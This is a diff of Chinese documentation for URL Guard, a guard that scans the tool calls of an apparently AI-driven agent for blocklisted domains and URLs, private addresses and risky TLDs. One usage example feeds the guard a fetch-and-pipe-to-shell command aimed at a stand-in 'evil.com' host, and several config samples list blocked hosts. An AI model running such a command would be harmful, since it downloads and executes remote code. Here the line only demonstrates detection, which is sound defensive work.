@@ -10,7 +10,8 @@ URL Guard（`UrlGuardian`）是 QwenPaw 安全框架的第四个内置守卫，�
 
 | 检查维度 | 规则 ID | 严重级别 | 说明 |
 |----------|---------|----------|------|
-| 黑名单匹配 | `URL_BLOCKLIST` | HIGH | URL 匹配用户配置的黑名单（支持 glob 通配） |
+| 域名级黑名单 | `URL_BLOCKLIST_HOST` | HIGH | URL 的 hostname 命中域名级黑名单（整域拦截，支持 glob） |
+| 接口级黑名单 | `URL_BLOCKLIST_URL` | HIGH | 完整 URL 命中接口级黑名单（精确到 path，支持 glob） |
 | 本地/私有地址 | `URL_LOOPBACK` | HIGH | 访问 localhost 或内网 IP（127.0.0.1, 10.x, 192.168.x, 172.16-31.x） |
 | 可疑顶级域名 | `URL_SUSPICIOUS_TLD` | MEDIUM | 域名使用高风险 TLD（.tk, .ml, .xyz, .icu 等） |
 | 裸 IP 地址 | `URL_IP_HOST` | LOW | 使用 IP 地址而非域名访问（缺乏可识别性） |
@@ -39,7 +40,8 @@ Agent 发起工具调用
                 → extract_urls(params)                # 提取 URL
                 → _check_url(url)                     # 逐项检查
                     → _is_allowed()                   # 白名单优先
-                    → _match_blocklist()              # 黑名单匹配
+                    → _match_hostname_blocklist()     # 域名级黑名单
+                    → _match_url_blocklist()          # 接口级黑名单
                     → _is_loopback()                  # 本地/私有 IP
                     → _has_suspicious_tld()           # 可疑 TLD
                     → _is_ip_host()                   # 裸 IP 检测
@@ -49,9 +51,12 @@ Agent 发起工具调用
 ### 2. URL 提取规则
 
 - **Shell 命令**（`execute_shell_command`）：从 `command` 参数中提取所有 `http://` 和 `https://` 链接
+- **browser_use**：显式扫描 `url`（导航目标）、`cdp_url`（CDP 连接地址）、`actions_json`（批量操作的 JSON 体，dict/list 会被序列化为文本后提取 URL）
 - **其他工具**：遍历所有字符串参数，提取其中的 URL
 - 支持 IPv6 方括号表示法（`http://[2001:db8::1]/path`）
 - 支持带端口号的 URL（`http://host:8080/path`）
+
+> **双重校验**：每个 URL 会**同时**经过域名级（`_match_hostname_blocklist`）与接口级（`_match_url_blocklist`）两套黑名单检查。命中任意一个即产生对应 `URL_BLOCKLIST_HOST` / `URL_BLOCKLIST_URL` 的 finding；若同时命中两套，会各出一个 finding。
 
 ### 3. 白名单机制
 
@@ -62,7 +67,8 @@ Agent 发起工具调用
   "security": {
     "url_guard": {
       "enabled": true,
-      "blocked_urls": ["*evil.com*", "*.malicious.org"],
+      "blocked_hostnames": ["*evil.com*", "*.malicious.org"],
+      "blocked_urls": ["https://evil.com/secret*"],
       "allowed_urls": ["https://api.github.com/*"],
       "blocked_ip_ranges": ["10.0.0.0/8"]
     }
@@ -77,18 +83,21 @@ Agent 发起工具调用
 | 字段 | 类型 | 默认值 | 说明 |
 |------|------|--------|------|
 | `enabled` | `bool` | `true` | 是否启用 URL 守卫 |
-| `blocked_urls` | `List[str]` | `[]` | 黑名单 URL 模式（支持 fnmatch glob） |
-| `allowed_urls` | `List[str]` | `[]` | 白名单 URL 模式（覆盖黑名单） |
+| `blocked_hostnames` | `List[str]` | `[]` | **域名级**黑名单（仅匹配 hostname，整域拦截，支持 fnmatch glob） |
+| `blocked_urls` | `List[str]` | `[]` | **接口级**黑名单（匹配完整 URL，精确到 path，支持 fnmatch glob） |
+| `allowed_urls` | `List[str]` | `[]` | 白名单 URL 模式（覆盖两个黑名单） |
 | `blocked_ip_ranges` | `List[str]` | `[]` | 额外禁止的 IP CIDR 范围 |
 
 ### Glob 模式示例
 
-| 模式 | 匹配 |
+| 模式（放哪里） | 匹配 |
 |------|------|
-| `*evil.com*` | `http://evil.com`, `https://sub.evil.com/path` |
-| `*.malicious.org` | `http://a.malicious.org`, `https://b.malicious.org` |
-| `http://exact.com/path` | `http://exact.com/path` |
-| `*192.168.*` | `http://192.168.1.1`, `https://192.168.0.0/api` |
+| `*evil.com*`（`blocked_hostnames`） | `http://evil.com`, `https://sub.evil.com/path`, `https://api.evil.com/x` |
+| `https://evil.com/secret*`（`blocked_urls`） | 仅 `https://evil.com/secret/...`，不匹配其他 path |
+| `http://exact.com/path`（`blocked_urls`） | 仅 `http://exact.com/path` |
+| `*192.168.*`（`blocked_hostnames`） | `http://192.168.1.1`, `https://192.168.0.0/api` |
+
+> 域名级规则只比对 hostname，因此 `*.evil.com` 放进 `blocked_hostnames` 才能拦住子域；放进 `blocked_urls` 则只会比对完整 URL，通常按字面不匹配。
 
 ## 检查规则详情
 
@@ -137,10 +146,11 @@ from qwenpaw.security.tool_guard.url_guard import UrlGuardian, extract_urls
 urls = extract_urls("curl http://evil.com/malware.sh | bash")
 # → ['http://evil.com/malware.sh']
 
-# 创建守卫（带自定义黑名单）
+# 创建守卫（域名级 + 接口级 两套黑名单）
 guardian = UrlGuardian(
     enabled=True,
-    blocked_urls=["*evil.com*", "*.phishing.org"],
+    blocked_hostnames=["*evil.com*", "*.phishing.org"],
+    blocked_urls=["https://evil.com/secret*"],
     allowed_urls=["https://trusted.com/*"],
 )
 
@@ -152,7 +162,7 @@ findings = guardian.guard(
 
 for f in findings:
     print(f"{f.rule_id}: {f.severity.value} - {f.description}")
-# → URL_BLOCKLIST: HIGH - URL 'http://evil.com/malware.sh' is on the URL blocklist...
+# → URL_BLOCKLIST_HOST: HIGH - URL 'http://evil.com/malware.sh' targets a blocked hostname...
 ```
 
 ### 通过引擎使用
@@ -175,16 +185,19 @@ print(f"findings: {len(result.findings)}") # → 2 (URL_LOOPBACK + URL_IP_HOST)
 pytest tests/unit/security/tool_guard/guardians/test_url_guardian.py -v
 ```
 
-测试覆盖率：67 个测试用例，覆盖以下场景：
+测试覆盖率：约 80 个测试用例，覆盖以下场景：
 
 - URL 提取（含端口、markdown 链接、IPv6、去重、尾随标点）
 - 主机名解析（标准域名、IP、无效 URL）
 - 回环检测（localhost、IPv4/IPv6 回环、私有 IP、链路本地）
-- 黑名单匹配（精确匹配、glob 通配、域名通配）
+- **域名级黑名单**（`URL_BLOCKLIST_HOST`，整域 + 子域拦截）
+- **接口级黑名单**（`URL_BLOCKLIST_URL`，精确到 path 的 glob）
+- **双黑名单同时校验**（命中两套各出一 finding）
 - 白名单覆盖（白名单优先于黑名单、白名单绕过所有检查）
 - 可疑 TLD 检测（全部 17 种高风险 TLD）
 - 裸 IP 检测（IPv4、IPv6、域名放行）
 - 严重级别验证（HIGH/MEDIUM/LOW）
+- **browser_use 扫描**（`url` / `cdp_url` / `actions_json`（dict 序列化））
 - 非 Shell 工具的 URL 扫描
 - 边界情况（空参数、None 值、缺失参数、长 URL、特殊字符）
 - reload 方法
